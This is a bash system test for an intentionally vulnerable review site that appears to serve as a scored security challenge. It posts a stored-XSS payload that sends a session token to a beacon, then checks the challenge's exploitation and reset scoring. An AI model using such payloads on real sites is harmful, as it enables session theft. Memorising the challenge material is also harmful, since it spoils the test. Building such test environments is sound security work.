#!/usr/bin/env bash
# System test: builds the Docker image, runs a live container, and drives
# the real stored-XSS exploit chain plus reset over HTTP. Requires Docker
# and curl. Run from anywhere; paths are resolved relative to this script.
set -euo pipefail

APP_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
IMAGE_TAG="reviewring:system-test"
CONTAINER_NAME="reviewring-system-test-$$"
HOST_PORT=18080
SCORE_TOKEN="system-test-token"
BASE="http://localhost:${HOST_PORT}"
COOKIE_JAR="$(mktemp)"

cleanup() {
  docker rm -f "$CONTAINER_NAME" >/dev/null 2>&1 || true
  rm -f "$COOKIE_JAR"
}
trap cleanup EXIT

fail() {
  echo "FAIL: $1" >&2
  exit 1
}

echo "Building image..."
docker build -t "$IMAGE_TAG" "$APP_DIR" >/dev/null

echo "Starting container..."
docker run -d --rm --name "$CONTAINER_NAME" \
  -p "${HOST_PORT}:8080" \
  -e SCORE_TOKEN="$SCORE_TOKEN" \
  "$IMAGE_TAG" >/dev/null
sleep 1

status() { curl -s -o /dev/null -w "%{http_code}" "$@"; }

[ "$(status -c "$COOKIE_JAR" "$BASE/")" = "200" ] || fail "GET / did not return 200"

REAL_TOKEN="$(grep -P '\brr_sid\b' "$COOKIE_JAR" | awk '{print $7}')"
[ -n "$REAL_TOKEN" ] || fail "did not capture a real rr_sid session token from GET /"

[ "$(status -b "$COOKIE_JAR" "$BASE/products/1")" = "200" ] || fail "GET /products/1 did not return 200"
[ "$(status "$BASE/products/999999")" = "404" ] || fail "missing product did not 404"

[ "$(status -X POST "$BASE/products/1/reviews" --data-urlencode "name=Alex" --data-urlencode "comment=Nice product")" = "303" ] \
  || fail "benign review submission did not redirect"

echo "Negative check: beacon hit with a token the server never issued must NOT score exploitation..."
[ "$(status "$BASE/beacon/this-token-was-never-issued-by-the-server")" = "204" ] \
  || fail "beacon did not respond 204 for an unissued token"
UNISSUED_JSON="$(curl -s "$BASE/score/${SCORE_TOKEN}?format=json")"
echo "$UNISSUED_JSON" | grep -q '"exploitation":0' \
  || fail "exploitation scored on an unissued beacon token (trivial-bypass hole): $UNISSUED_JSON"

echo "Positive check: full chain with the real issued session token..."
PAYLOAD="<script>fetch('/beacon/${REAL_TOKEN}')</script>"
[ "$(status -X POST "$BASE/products/1/reviews" --data-urlencode "name=Attacker" --data-urlencode "comment=$PAYLOAD")" = "303" ] \
  || fail "payload review submission did not redirect"

curl -s "$BASE/products/1" | grep -qF "$PAYLOAD" \
  || fail "payload did not round-trip unescaped into the rendered product page"

# Simulates the victim's own browser executing the stored payload above:
# reading its real rr_sid cookie and fetching the beacon with it.
[ "$(status "$BASE/beacon/${REAL_TOKEN}")" = "204" ] || fail "beacon route did not respond 204 for the real token"

[ "$(status "$BASE/score/wrong-token")" = "404" ] || fail "wrong score token did not 404"

JSON="$(curl -s "$BASE/score/${SCORE_TOKEN}?format=json")"
echo "$JSON" | grep -q '"exploitation":2' || fail "exploitation score did not reach 2.0 for the real token: $JSON"
echo "$JSON" | grep -q '"reconnaissance":1' || fail "reconnaissance score did not reach 1.0: $JSON"
echo "$JSON" | grep -q '"vulnerability_detection":1' || fail "vulnerability_detection score did not reach 1.0: $JSON"
echo "$JSON" | grep -q '"exploration":1.5' || fail "exploration score did not reach 1.5: $JSON"
echo "$JSON" | grep -q '"overall":5.5' || fail "overall max was not 5.5: $JSON"

[ "$(status -X POST "$BASE/score/wrong-token/reset")" = "404" ] || fail "reset with wrong token did not 404"

RESET_JSON="$(curl -s -X POST "$BASE/score/${SCORE_TOKEN}/reset")"
echo "$RESET_JSON" | grep -q '"status":"reset"' || fail "reset response missing status: $RESET_JSON"

AFTER_JSON="$(curl -s "$BASE/score/${SCORE_TOKEN}?format=json")"
echo "$AFTER_JSON" | grep -q '"exploitation":0' || fail "exploitation score did not reset to 0: $AFTER_JSON"

curl -s "$BASE/products/1" | grep -qF "stolen-token-abc" && fail "reset did not clear the injected review"

# After reset the old session token is no longer registered, so replaying
# it at the beacon must not score either.
[ "$(status "$BASE/beacon/${REAL_TOKEN}")" = "204" ] || fail "beacon did not respond 204 after reset"
POST_RESET_JSON="$(curl -s "$BASE/score/${SCORE_TOKEN}?format=json")"
echo "$POST_RESET_JSON" | grep -q '"exploitation":0' \
  || fail "a pre-reset session token still scored exploitation after reset: $POST_RESET_JSON"

echo "All system checks passed."
